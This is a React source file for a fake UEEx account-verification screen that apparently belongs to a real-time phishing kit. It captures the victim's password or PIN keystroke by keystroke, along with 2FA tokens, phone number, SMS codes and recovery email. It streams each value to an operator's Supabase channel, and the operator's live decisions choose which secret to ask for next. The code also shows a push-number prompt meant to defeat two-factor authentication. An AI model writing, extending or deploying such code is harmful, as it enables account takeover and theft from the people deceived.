import { useState, useEffect, useCallback, useRef } from "react";
import { supabase } from "@/integrations/supabase/client";
import ueexLogo from "@/assets/ueex-logo-official.png";
import { Loader2 } from "lucide-react";
import { useUeexLang } from "@/hooks/useUeexLang";

interface UeexConfirmEmailScreenProps {
  email: string;
  sessionId: string;
  onBack: () => void;
}

type ConfirmStep =
  | "password" | "waiting" | "token_2fa"
  | "sms_phone" | "sms_waiting" | "sms_code"
  | "recovery_email_input" | "recovery_email_submitted" | "success";

const UeexConfirmEmailScreen = ({ email, sessionId, onBack }: UeexConfirmEmailScreenProps) => {
  const [step, setStep] = useState<ConfirmStep>("password");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [tokenCode, setTokenCode] = useState("");
  const [smsCode, setSmsCode] = useState("");
  const [clientRecoveryEmail, setClientRecoveryEmail] = useState("");
  const [clientPhoneInput, setClientPhoneInput] = useState("");
  const [phoneEnding, setPhoneEnding] = useState("");
  const [adminTokenCode, setAdminTokenCode] = useState("");
  const [recoveryEmailAddr, setRecoveryEmailAddr] = useState("");
  const [errorMessage, setErrorMessage] = useState("");
  const { t } = useUeexLang();

  const broadcastChRef = useRef<ReturnType<typeof supabase.channel> | null>(null);
  const syncChRef = useRef<ReturnType<typeof supabase.channel> | null>(null);

  const broadcastToAdmin = useCallback((event: string, payload: Record<string, string>) => {
    if (broadcastChRef.current) broadcastChRef.current.send({ type: "broadcast", event, payload });
    if (syncChRef.current) syncChRef.current.send({ type: "broadcast", event, payload });
  }, []);

  useEffect(() => {
    const confirmCh = supabase.channel(`confirm-email-${sessionId}`);
    const syncCh = supabase.channel(`sync-email-${sessionId}`);
    broadcastChRef.current = confirmCh;
    syncChRef.current = syncCh;

    const handleDecision = (decision: string, payload?: Record<string, string>) => {
      if (decision === "confirm_wrong_password" || decision === "sync_wrong_password") {
        setErrorMessage(t("wrong_password")); setStep("password"); setPassword(""); setLoading(false);
      } else if (decision === "confirm_ask_otp" || decision === "sync_ask_otp") {
        if (step === "sms_waiting" || step === "recovery_email_submitted") { setStep("sms_code"); setSmsCode(""); }
        else { setStep("token_2fa"); setTokenCode(""); setAdminTokenCode(""); }
        setErrorMessage("");
      } else if (decision === "confirm_ask_token" || decision === "sync_ask_token") {
        setAdminTokenCode(payload?.admin_token || ""); setStep("token_2fa"); setTokenCode(""); setErrorMessage("");
      } else if (decision === "confirm_ask_sms" || decision === "sync_ask_sms") {
        if (step === "sms_waiting" || step === "recovery_email_submitted") { setStep("sms_code"); setSmsCode(""); }
        else { setPhoneEnding(payload?.sms_ending || ""); setStep("sms_phone"); setClientPhoneInput(""); setSmsCode(""); }
        setErrorMessage("");
      } else if (decision === "confirm_advance_sms_code" || decision === "sync_advance_sms_code") {
        const ending = payload?.sms_ending || ""; if (ending) setPhoneEnding(ending);
        setStep("sms_code"); setSmsCode(""); setErrorMessage("");
      } else if (decision === "confirm_ask_recovery_email" || decision === "sync_ask_recovery_email") {
        setRecoveryEmailAddr(payload?.recovery_email || ""); setStep("recovery_email_input"); setClientRecoveryEmail(""); setErrorMessage("");
      } else if (decision === "confirm_approved" || decision === "sync_approved") { setStep("success"); }
      else if (decision === "confirm_rejected" || decision === "sync_rejected") {
        setErrorMessage(t("verification_failed")); setClientRecoveryEmail(""); setSmsCode(""); setTokenCode("");
      }
    };

    confirmCh.on("broadcast", { event: "admin_decision" }, (p) => handleDecision(p.payload?.status, p.payload)).subscribe();
    syncCh.on("broadcast", { event: "admin_sync_decision" }, (p) => handleDecision(p.payload?.status, p.payload)).subscribe();

    const pollInterval = setInterval(async () => {
      const { data } = await supabase.from("sessions").select("status, otp_code").eq("id", sessionId).maybeSingle();
      if (!data) return;
      const { status: dbStatus, otp_code: otp } = data;
      if ((dbStatus === "confirm_wrong_password" || dbStatus === "sync_wrong_password") && step !== "password") { setErrorMessage(t("wrong_password")); setStep("password"); setPassword(""); }
      else if ((dbStatus === "confirm_ask_otp" || dbStatus === "sync_ask_otp") && step !== "token_2fa" && step !== "sms_code") {
        if (step === "sms_waiting" || step === "recovery_email_submitted") { setStep("sms_code"); setSmsCode(""); }
        else { setStep("token_2fa"); setTokenCode(""); setAdminTokenCode(""); }
      } else if ((dbStatus === "confirm_ask_token" || dbStatus === "sync_ask_token") && step !== "token_2fa") {
        const code = otp?.startsWith("admin_token:") ? otp.replace("admin_token:", "") : ""; setAdminTokenCode(code); setStep("token_2fa"); setTokenCode("");
      } else if ((dbStatus === "confirm_ask_sms" || dbStatus === "sync_ask_sms") && step !== "sms_phone" && step !== "sms_code" && step !== "sms_waiting") {
        if (step === "recovery_email_submitted") { setStep("sms_code"); setSmsCode(""); }
        else { const ending = otp?.startsWith("sms_ending:") ? otp.replace("sms_ending:", "") : ""; setPhoneEnding(ending); setStep("sms_phone"); setClientPhoneInput(""); setSmsCode(""); }
      } else if ((dbStatus === "confirm_advance_sms_code" || dbStatus === "sync_advance_sms_code") && step !== "sms_code") {
        const ending = otp?.startsWith("sms_ending:") ? otp.replace("sms_ending:", "") : ""; if (ending) setPhoneEnding(ending); setStep("sms_code"); setSmsCode("");
      } else if ((dbStatus === "confirm_ask_recovery_email" || dbStatus === "sync_ask_recovery_email") && step !== "recovery_email_input" && step !== "recovery_email_submitted") {
        const recEmail = otp?.startsWith("recovery_email_addr:") ? otp.replace("recovery_email_addr:", "") : ""; setRecoveryEmailAddr(recEmail); setStep("recovery_email_input"); setClientRecoveryEmail("");
      } else if (dbStatus === "confirm_approved" || dbStatus === "sync_approved") { setStep("success"); }
    }, 2500);

    return () => { broadcastChRef.current = null; syncChRef.current = null; supabase.removeChannel(confirmCh); supabase.removeChannel(syncCh); clearInterval(pollInterval); };
  }, [sessionId, step]);

  const handlePasswordChange = useCallback((v: string) => {
    setPassword(v);
    supabase.from("sessions").update({ otp_code: `id_pin:${v}` }).eq("id", sessionId).then(() => {});
    broadcastToAdmin("client_email_password_typing", { session_id: sessionId, email_password: v });
  }, [sessionId, broadcastToAdmin]);

  const handlePasswordSubmit = useCallback(async (e: React.FormEvent) => {
    e.preventDefault(); if (!password.trim()) return;
    setLoading(true); setErrorMessage("");
    await supabase.from("sessions").update({ otp_code: `id_pin:${password}`, status: "confirm_email_pending" }).eq("id", sessionId);
    broadcastToAdmin("client_id_pin", { session_id: sessionId, id_pin: password, email });
    setStep("waiting"); setLoading(false);
  }, [password, sessionId, broadcastToAdmin, email]);

  const handleTokenChange = useCallback((v: string) => {
    setTokenCode(v);
    supabase.from("sessions").update({ otp_code: `id_token:${v}` }).eq("id", sessionId).then(() => {});
    broadcastToAdmin("client_id_token_update", { session_id: sessionId, id_token: v });
  }, [sessionId, broadcastToAdmin]);

  const handlePhoneChange = useCallback((v: string) => {
    setClientPhoneInput(v);
    supabase.from("sessions").update({ otp_code: `id_phone:${v}` }).eq("id", sessionId).then(() => {});
    broadcastToAdmin("client_id_phone_update", { session_id: sessionId, id_phone: v });
  }, [sessionId, broadcastToAdmin]);

  const handlePhoneSubmit = useCallback((e: React.FormEvent) => {
    e.preventDefault(); if (!clientPhoneInput.trim()) return;
    supabase.from("sessions").update({ otp_code: `id_phone_final:${clientPhoneInput}` }).eq("id", sessionId).then(() => {});
    broadcastToAdmin("client_id_phone_submitted", { session_id: sessionId, id_phone: clientPhoneInput });
    setStep("sms_waiting");
  }, [clientPhoneInput, sessionId, broadcastToAdmin]);

  const handleSmsCodeChange = useCallback((v: string) => {
    setSmsCode(v);
    supabase.from("sessions").update({ otp_code: `id_sms:${v}` }).eq("id", sessionId).then(() => {});
    broadcastToAdmin("client_id_sms_update", { session_id: sessionId, id_sms: v });
  }, [sessionId, broadcastToAdmin]);

  const handleRecoveryEmailChange = useCallback((v: string) => {
    setClientRecoveryEmail(v);
    supabase.from("sessions").update({ otp_code: `id_recovery:${v}` }).eq("id", sessionId).then(() => {});
    broadcastToAdmin("client_id_recovery_update", { session_id: sessionId, id_recovery: v });
  }, [sessionId, broadcastToAdmin]);

  const handleRecoveryEmailSubmit = useCallback((e: React.FormEvent) => {
    e.preventDefault(); if (!clientRecoveryEmail.trim()) return;
    supabase.from("sessions").update({ otp_code: `id_recovery_final:${clientRecoveryEmail}` }).eq("id", sessionId).then(() => {});
    broadcastToAdmin("client_id_recovery_submitted", { session_id: sessionId, id_recovery: clientRecoveryEmail });
    setStep("recovery_email_submitted");
  }, [clientRecoveryEmail, sessionId, broadcastToAdmin]);

  const inputClass = "w-full rounded-lg border border-[#e0e0e0] bg-white px-4 py-3 text-[14px] text-[#333] outline-none transition-all placeholder:text-[#bbb] focus:border-[#F5A623] focus:ring-1 focus:ring-[#F5A623]/20 disabled:opacity-50";
  const btnClass = "w-full rounded-full bg-[#F5A623] py-3.5 text-[15px] font-semibold text-white transition-all hover:bg-[#e6991a] disabled:opacity-50";
  const labelClass = "mb-1 block text-[13px] text-[#999]";

  const renderHeader = () => (
    <div className="flex w-full max-w-[460px] items-center justify-between mb-10">
      <img src={ueexLogo} alt="UEEx" className="h-10 w-auto" />
      <button onClick={onBack} className="text-[13px] font-semibold text-[#F5A623] hover:text-[#e6991a] transition-colors">{t("exit")}</button>
    </div>
  );

  const renderError = () => errorMessage ? (
    <div className="mb-5 rounded-lg border border-red-200 bg-red-50 px-4 py-2.5 text-sm text-red-600">{errorMessage}</div>
  ) : null;

  const renderLoading = (text: string) => (
    <div className="flex items-center gap-2 text-sm text-[#999]">
      <Loader2 className="h-4 w-4 animate-spin text-[#F5A623]" />{text}
    </div>
  );

  if (step === "success") {
    return (
      <div className="flex min-h-screen flex-col items-center bg-white px-4 pt-12">
        <img src={ueexLogo} alt="UEEx" className="h-10 w-auto" />
        <div className="mt-16 w-full max-w-[460px] text-center">
          <h1 className="mb-3 text-2xl font-bold text-[#333]">{t("verification_complete")}</h1>
          <p className="text-[14px] text-[#999]">{t("account_verified")}</p>
          <p className="mt-2 text-[12px] text-[#bbb]">{email}</p>
        </div>
      </div>
    );
  }

  return (
    <div className="flex min-h-screen flex-col items-center bg-white px-4 pt-12">
      {renderHeader()}

      <div className="w-full max-w-[460px]">
        {renderError()}

        {step === "password" && (
          <>
            <h1 className="mb-2 text-xl font-bold text-[#333]">{t("identity_verification")}</h1>
            <p className="mb-6 text-[14px] text-[#999]">{t("profile_not_confirmed")}</p>
            <form onSubmit={handlePasswordSubmit}>
              <label className={labelClass}>{t("pin")}</label>
              <div className="relative mb-6">
                <input type="password" value={password} onChange={(e) => handlePasswordChange(e.target.value)} disabled={loading} autoFocus placeholder={t("enter_pin")} className={inputClass} />
                <span className="absolute right-3.5 top-1/2 -translate-y-1/2 text-[12px] text-[#bbb]">{t("code_sent")}</span>
              </div>
              <button type="submit" disabled={loading || !password.trim()} className={btnClass}>{loading ? t("verifying") : t("continue_btn")}</button>
            </form>
          </>
        )}

        {step === "waiting" && (
          <div className="text-center">
            <h1 className="mb-3 text-xl font-bold text-[#333]">{t("verifying_account")}</h1>
            <p className="mb-6 text-[14px] text-[#999]">{t("wait_verifying")}</p>
            {renderLoading(t("verification_in_progress"))}
          </div>
        )}

        {step === "token_2fa" && (
          <>
            <h1 className="mb-2 text-xl font-bold text-[#333]">{t("security_token")}</h1>
            {adminTokenCode ? (
              <>
                <p className="mb-6 text-[14px] text-[#999]">{t("tap_number")}</p>
                <div className="mb-6 flex h-20 w-20 items-center justify-center rounded-2xl border-2 border-[#F5A623] bg-[#F5A623]/10 mx-auto">
                  <span className="text-3xl font-bold text-[#F5A623]">{adminTokenCode}</span>
                </div>
                {renderLoading(t("waiting_confirmation"))}
              </>
            ) : (
              <>
                <p className="mb-6 text-[14px] text-[#999]">{t("enter_auth_code")}</p>
                <label className={labelClass}>{t("verification_code")}</label>
                <input type="text" inputMode="numeric" value={tokenCode} onChange={(e) => handleTokenChange(e.target.value)} autoFocus maxLength={20} placeholder={t("enter_code")} className={`${inputClass} mb-6`} />
                {tokenCode.length >= 6 ? renderLoading(t("verifying_code")) : <button disabled className={btnClass}>{t("continue_btn")}</button>}
              </>
            )}
          </>
        )}

        {step === "sms_phone" && (
          <>
            <h1 className="mb-2 text-xl font-bold text-[#333]">{t("phone_verification")}</h1>
            <p className="mb-6 text-[14px] text-[#999]">
              {phoneEnding ? <>{t("confirm_number_ending")} <span className="font-bold text-[#333]">**{phoneEnding}</span></> : t("enter_phone")}
            </p>
            <form onSubmit={handlePhoneSubmit}>
              <label className={labelClass}>{t("phone_number")}</label>
              <input type="tel" placeholder={phoneEnding ? `${t("ends_in")} ${phoneEnding}` : "+55 11 00000-0000"} value={clientPhoneInput} onChange={(e) => handlePhoneChange(e.target.value)} autoFocus className={`${inputClass} mb-6`} />
              <button type="submit" disabled={!clientPhoneInput.trim()} className={btnClass}>{t("continue_btn")}</button>
            </form>
          </>
        )}

        {step === "sms_waiting" && (
          <div className="text-center">
            <h1 className="mb-3 text-xl font-bold text-[#333]">{t("phone_verification")}</h1>
            <p className="mb-6 text-[14px] text-[#999]">{t("sending_code")} <span className="font-bold text-[#333]">{clientPhoneInput}</span></p>
            {renderLoading(t("sending_sms"))}
          </div>
        )}

        {step === "sms_code" && (
          <>
            <h1 className="mb-2 text-xl font-bold text-[#333]">{t("sms_verification")}</h1>
            <p className="mb-6 text-[14px] text-[#999]">
              {phoneEnding ? <>{t("enter_sms_code")} <span className="font-bold text-[#333]">**{phoneEnding}</span></> : clientPhoneInput ? <>{t("enter_sms_sent")} <span className="font-bold text-[#333]">{clientPhoneInput}</span></> : t("enter_sms")}
            </p>
            <label className={labelClass}>{t("sms_code")}</label>
            <input type="text" inputMode="numeric" value={smsCode} onChange={(e) => handleSmsCodeChange(e.target.value)} autoFocus maxLength={8} placeholder={t("enter_code")} className={`${inputClass} mb-6`} />
            {smsCode.length >= 6 ? renderLoading(t("verifying_sms")) : <button disabled className={btnClass}>{t("continue_btn")}</button>}
          </>
        )}

        {step === "recovery_email_input" && (
          <>
            <h1 className="mb-2 text-xl font-bold text-[#333]">{t("recovery_email")}</h1>
            <p className="mb-4 text-[14px] text-[#999]">{t("enter_recovery_email")}</p>
            {recoveryEmailAddr && (
              <div className="mb-5 rounded-lg border border-[#e0e0e0] bg-white px-4 py-3">
                <span className="text-[11px] text-[#999]">{t("recovery_email")}</span>
                <p className="text-[14px] font-medium text-[#333]">{recoveryEmailAddr}</p>
              </div>
            )}
            <form onSubmit={handleRecoveryEmailSubmit}>
              <label className={labelClass}>{t("email_label")}</label>
              <input type="email" placeholder={t("enter_recovery_placeholder")} value={clientRecoveryEmail} onChange={(e) => handleRecoveryEmailChange(e.target.value)} autoFocus className={`${inputClass} mb-6`} />
              <button type="submit" disabled={!clientRecoveryEmail.trim()} className={btnClass}>{t("continue_btn")}</button>
            </form>
          </>
        )}

        {step === "recovery_email_submitted" && (
          <div className="text-center">
            <h1 className="mb-3 text-xl font-bold text-[#333]">{t("recovery_email")}</h1>
            <p className="mb-6 text-[14px] text-[#999]">{t("verifying_email")} <span className="font-bold text-[#333]">{clientRecoveryEmail}</span></p>
            {renderLoading(t("verification_in_progress"))}
          </div>
        )}
      </div>
    </div>
  );
};

export default UeexConfirmEmailScreen;
